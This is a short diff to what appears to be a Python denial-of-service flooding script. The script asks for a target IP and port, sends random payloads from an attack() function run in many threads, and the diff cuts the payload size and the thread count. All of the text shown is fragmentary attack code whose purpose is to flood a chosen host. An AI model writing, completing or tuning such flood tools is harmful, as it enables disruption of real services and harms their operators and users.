@@ -7,7 +7,7 @@ target_ip = input("Enter the target IP address: ")
 target_port = int(input("Enter the target port number (80 for HTTP): "))
 
 
-payload_size = 1024 * 100  
+payload_size = 1024 * 50
 message = os.urandom(payload_size)
 
 
@@ -23,7 +23,7 @@ def attack():
             sock.close()
 
 
-threads_count = 100000
+threads_count = 10000
 
 
 for _ in range(threads_count):
